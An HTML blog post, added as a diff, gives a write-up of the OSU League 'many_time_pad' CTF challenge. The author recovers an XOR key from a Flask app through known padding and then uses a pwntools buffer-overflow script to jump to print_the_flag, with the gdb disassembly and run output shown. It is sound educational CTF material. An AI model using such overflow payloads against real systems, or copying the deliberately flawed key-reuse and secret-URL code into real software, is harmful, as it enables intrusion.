@@ -1,0 +1,307 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="For this challenge, we are giving a link to a web page. Going to it, we are greeted with this:
+  They also give us the source code for the web server:
+from app import app from app import cfg from flask import render_template,request,redirect,make_response,send_file #serve index.html @app.route(&amp;#34;/&amp;#34;) def index(): return render_template(&amp;#34;index.html&amp;#34;) #encrypt messages that are POSTed to /encrypt @app.route(&amp;#34;/encrypt&amp;#34;, methods=[&amp;#34;POST&amp;#34;]) def encrypt(): #truncate message if longer than 256 bytes, convert to byte string plaintext = request." />
+<meta name="keywords" content=", osuleague, ctf, security" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="/blog/many_time_pad/" />
+
+
+    <title>
+        
+            OSU League 2020/2021 - many_time_pad Writeup :: Cameron McCawley 
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="/main.d7bdd8ee18bfbf4c605488a7e5b1b92cd980dfeed2bdaeab4dd5e931a7a78bc0.css">
+
+
+
+
+
+
+<meta itemprop="name" content="OSU League 2020/2021 - many_time_pad Writeup">
+<meta itemprop="description" content="For this challenge, we are giving a link to a web page. Going to it, we are greeted with this:
+  They also give us the source code for the web server:
+from app import app from app import cfg from flask import render_template,request,redirect,make_response,send_file #serve index.html @app.route(&#34;/&#34;) def index(): return render_template(&#34;index.html&#34;) #encrypt messages that are POSTed to /encrypt @app.route(&#34;/encrypt&#34;, methods=[&#34;POST&#34;]) def encrypt(): #truncate message if longer than 256 bytes, convert to byte string plaintext = request.">
+<meta itemprop="datePublished" content="2020-12-05T00:00:00+00:00" />
+<meta itemprop="dateModified" content="2020-12-05T00:00:00+00:00" />
+<meta itemprop="wordCount" content="686">
+<meta itemprop="image" content=""/>
+
+
+
+<meta itemprop="keywords" content="osuleague,ctf,security," />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content=""/>
+
+<meta name="twitter:title" content="OSU League 2020/2021 - many_time_pad Writeup"/>
+<meta name="twitter:description" content="For this challenge, we are giving a link to a web page. Going to it, we are greeted with this:
+  They also give us the source code for the web server:
+from app import app from app import cfg from flask import render_template,request,redirect,make_response,send_file #serve index.html @app.route(&#34;/&#34;) def index(): return render_template(&#34;index.html&#34;) #encrypt messages that are POSTed to /encrypt @app.route(&#34;/encrypt&#34;, methods=[&#34;POST&#34;]) def encrypt(): #truncate message if longer than 256 bytes, convert to byte string plaintext = request."/>
+
+
+
+
+    <meta property="og:title" content="OSU League 2020/2021 - many_time_pad Writeup" />
+<meta property="og:description" content="For this challenge, we are giving a link to a web page. Going to it, we are greeted with this:
+  They also give us the source code for the web server:
+from app import app from app import cfg from flask import render_template,request,redirect,make_response,send_file #serve index.html @app.route(&#34;/&#34;) def index(): return render_template(&#34;index.html&#34;) #encrypt messages that are POSTed to /encrypt @app.route(&#34;/encrypt&#34;, methods=[&#34;POST&#34;]) def encrypt(): #truncate message if longer than 256 bytes, convert to byte string plaintext = request." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/blog/many_time_pad/" />
+<meta property="og:image" content=""/>
+<meta property="article:published_time" content="2020-12-05T00:00:00+00:00" />
+<meta property="article:modified_time" content="2020-12-05T00:00:00+00:00" /><meta property="og:site_name" content="Cameron McCawley" />
+
+
+
+
+
+
+    <meta property="article:published_time" content="2020-12-05 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">cd ~/cameronmccawley</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="/about/">About</a></li><li><a href="/blog/">Blog</a></li><li><a href="/resume.pdf">Resume</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            <h2 class="post-title"><a href="/blog/many_time_pad/">OSU League 2020/2021 - many_time_pad Writeup</a></h2>
+
+            
+            
+            
+
+            <div class="post-content">
+                <p>For this challenge, we are giving a link to a web page.  Going to it, we are greeted with this:<br>
+<figure>
+    <img src="/img/1-many.png"/> 
+</figure>
+</p>
+<p>They also give us the source code for the web server:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> app <span style="color:#f92672">import</span> app
+<span style="color:#f92672">from</span> app <span style="color:#f92672">import</span> cfg
+<span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> render_template,request,redirect,make_response,send_file
+
+<span style="color:#75715e">#serve index.html</span>
+<span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#34;/&#34;</span>)
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">index</span>():
+    <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#34;index.html&#34;</span>)
+
+<span style="color:#75715e">#encrypt messages that are POSTed to /encrypt</span>
+<span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#34;/encrypt&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;POST&#34;</span>])
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">encrypt</span>():
+    <span style="color:#75715e">#truncate message if longer than 256 bytes, convert to byte string</span>
+    plaintext <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;message&#34;</span>)[:<span style="color:#ae81ff">256</span>]<span style="color:#f92672">.</span>encode()
+    <span style="color:#75715e">#pad message with \xff bytes</span>
+    plaintext <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xff</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">256</span> <span style="color:#f92672">-</span> len(plaintext))
+    <span style="color:#75715e">#xor byte string with secret key</span>
+    ciphertext <span style="color:#f92672">=</span> bytes([plaintext_byte <span style="color:#f92672">^</span> key_byte <span style="color:#66d9ef">for</span> plaintext_byte, key_byte <span style="color:#f92672">in</span> zip(plaintext, cfg<span style="color:#f92672">.</span>secret_byte_string)])
+    <span style="color:#75715e">#put the ciphertext in a response header</span>
+    resp <span style="color:#f92672">=</span> make_response(render_template(<span style="color:#e6db74">&#34;index.html&#34;</span>))
+    resp<span style="color:#f92672">.</span>headers[<span style="color:#e6db74">&#34;ciphertext&#34;</span>] <span style="color:#f92672">=</span> repr(ciphertext)
+    <span style="color:#66d9ef">return</span> resp
+
+<span style="color:#75715e">#send server source code to those who request it</span>
+<span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#34;/source&#34;</span>)
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">source</span>():
+    <span style="color:#66d9ef">return</span> send_file(<span style="color:#e6db74">&#34;./views.py&#34;</span>)
+
+<span style="color:#75715e">#secret admin page, the URL is the secret key so it is secure</span>
+<span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#34;/&#34;</span> <span style="color:#f92672">+</span> cfg<span style="color:#f92672">.</span>secret_byte_string<span style="color:#f92672">.</span>decode())
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">win</span>():
+    <span style="color:#66d9ef">return</span>(render_template(<span style="color:#e6db74">&#34;win.html&#34;</span>))
+</code></pre></div><p>Looking though the source code, it looks like our goal is to find <code>secret_byte_string</code>, as that will tell us the path to the admin site.  We also see how the ciphertext is generated.  It&rsquo;s an XOR between each byte of the plaintext we provide with the secret key.  So with the properties of XOR, if we know the plaintext and the ciphertext that would be generated, we can find the secret key!</p>
+<p>We see here that our plaintext gets padded with <code>\xff</code> to get to 256 bytes, so if we just don&rsquo;t input anything into the field box, then we know our plaintext is <code>\xff\xff\xff ... </code> 256 times. So let&rsquo;s try that, and look at the response header we get from sending it.</p>
+<figure>
+    <img src="/img/2-many.png"/> 
+</figure>
+
+<p>Alright, looks like we have the ciphertext, now to just XOR it with our plaintext. Xoring and coverting to ascii we get out path:<br>
+<code>if-you-tried-to-dirbuster-this-route-I-will-forward-you-the-OSUSEC-AWS-bill-never-gonna-give-you-up-never-gonna-let-you-down-never-gonna-run-around-and-desert-you-never-gonna-make-you-cry-never-gonna-say-goodbye-never-gonna-tell-a-lie-and-hurt-you-12345678</code></p>
+<p>We are then given a site with shows us how to set up our enviroment to do a pwn challenge along with a baby pwn to solve.  We are even given some skeleton code that we can use for the exploit.</p>
+<p>Downloading the binary and disassembling it through gdb, we can immediatly see a vulnerability.  At <code>main+53</code>, we have a call to fgets, which would allow us to perform a buffer overflow attack.</p>
+<pre><code>gdb-peda$ disass main
+Dump of assembler code for function main:
+   0x000000000040071b &lt;+0&gt;:     push   rbp
+   0x000000000040071c &lt;+1&gt;:     mov    rbp,rsp
+   0x000000000040071f &lt;+4&gt;:     sub    rsp,0x10
+   0x0000000000400723 &lt;+8&gt;:     mov    eax,0x0
+   0x0000000000400728 &lt;+13&gt;:    call   0x400692 &lt;check_the_key&gt;
+   0x000000000040072d &lt;+18&gt;:    test   eax,eax
+   0x000000000040072f &lt;+20&gt;:    jne    0x40075c &lt;main+65&gt;
+   0x0000000000400731 &lt;+22&gt;:    lea    rdi,[rip+0x108]        # 0x400840
+   0x0000000000400738 &lt;+29&gt;:    call   0x400520 &lt;puts@plt&gt;
+   0x000000000040073d &lt;+34&gt;:    mov    rdx,QWORD PTR [rip+0x20090c]        # 0x601050 &lt;stdin@@GLIBC_2.2.5&gt;
+   0x0000000000400744 &lt;+41&gt;:    lea    rax,[rbp-0x10]
+   0x0000000000400748 &lt;+45&gt;:    mov    esi,0x20
+   0x000000000040074d &lt;+50&gt;:    mov    rdi,rax
+   0x0000000000400750 &lt;+53&gt;:    call   0x400540 &lt;fgets@plt&gt;
+   0x0000000000400755 &lt;+58&gt;:    mov    eax,0x0
+   0x000000000040075a &lt;+63&gt;:    jmp    0x40075e &lt;main+67&gt;
+   0x000000000040075c &lt;+65&gt;:    nop
+   0x000000000040075d &lt;+66&gt;:    nop
+   0x000000000040075e &lt;+67&gt;:    leave
+   0x000000000040075f &lt;+68&gt;:    ret
+End of assembler dump.
+</code></pre><p>We can also open up the binary in Ghidra and see that the buffer we need to fill is 16 bytes long. Perfect, what can we do with this though?  Looking at the functions, we see something promising:</p>
+<pre><code>gdb-peda$ info functions
+
+0x0000000000400647  print_the_flag
+</code></pre><p>We also need to pass in our key we got from the web challenge portion to get to this point, so we need to remember to account for that.
+So our current plan of attack sounds like:</p>
+<ol>
+<li>Pass in our key</li>
+<li>Fill the buffer up with 16 byte</li>
+<li>Overwrite EBP with 8 bytes</li>
+<li>Overwrite EIP with the address of <code>print_the_flag</code></li>
+<li>Win</li>
+</ol>
+<p>In python, that looks like:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+buffer_size <span style="color:#f92672">=</span> <span style="color:#ae81ff">16</span>
+addr_of_printflag_function <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000400647</span>
+secret_key_string <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;if-you-tried-to-dirbuster-this-route-I-will-forward-you-the-OSUSEC-AWS-bill-never-gonna-give-you-up-never-gonna-let-you-down-never-gonna-run-around-and-desert-you-never-gonna-make-you-cry-never-gonna-say-goodbye-never-gonna-tell-a-lie-and-hurt-you-12345678&#34;</span>
+
+p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;ctf-league.osusec.org&#34;</span>, <span style="color:#ae81ff">31309</span>)
+
+<span style="color:#66d9ef">print</span>(p<span style="color:#f92672">.</span>recv())
+
+<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;sending the key string: &#34;</span> <span style="color:#f92672">+</span> secret_key_string)
+p<span style="color:#f92672">.</span>send(secret_key_string)
+<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;response: &#34;</span> <span style="color:#f92672">+</span> p<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode())
+
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> buffer_size
+
+payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;B&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>
+
+payload <span style="color:#f92672">+=</span> p64(addr_of_printflag_function)
+<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;payload: &#34;</span> <span style="color:#f92672">+</span> payload)
+p<span style="color:#f92672">.</span>send(payload)
+</code></pre></div><p>And running it we get the flag!!!</p>
+<pre><code>cameron@LAPTOP-PEKGUHAN:/mnt/c/Users/Cameron McCawley/Desktop/mtp$ python2 exploit.py
+[+] Opening connection to ctf-league.osusec.org on port 31309: Done
+enter the secret key from the web portion of this challenge
+sending the key string: if-you-tried-to-dirbuster-this-route-I-will-forward-you-the-OSUSEC-AWS-bill-never-gonna-give-you-up-never-gonna-let-you-down-never-gonna-run-around-and-desert-you-never-gonna-make-you-cry-never-gonna-say-goodbye-never-gonna-tell-a-lie-and-hurt-you-12345678
+response:
+
+payload: AAAAAAAAAAAAAAAABBBBBBBBG\x06\x00\x00\x00
+[*] Switching to interactive mode
+overflow my buffer and return to the print_the_flag function
+osu{L0N6_W01f_H^x0r}
+</code></pre>
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+            
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
+
+        <span class="tag"><a href="tags/osuleague/">osuleague</a></span>
+        <span class="tag"><a href="tags/ctf/">ctf</a></span>
+        <span class="tag"><a href="tags/security/">security</a></span>
+        
+    </p>
+
+            
+  		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2021</span>
+            
+            <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span><span><a href="posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
+        </div>
+    </div>
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="/bundle.min.af435e44374f1e99a669ea8cd5bb9a2fceed80588941a451bfddb66b86a67c9f40b0f417e9543a763f809aa7e9300d7b1d69bf99615810ba02ac70396d50fad5.js" integrity="sha512-r0NeRDdPHpmmaeqM1buaL87tgFiJQaRRv922a4amfJ9AsPQX6VQ6dj&#43;AmqfpMA17HWm/mWFYELoCrHA5bVD61Q=="></script>
+
+
+
+    </body>
+</html>
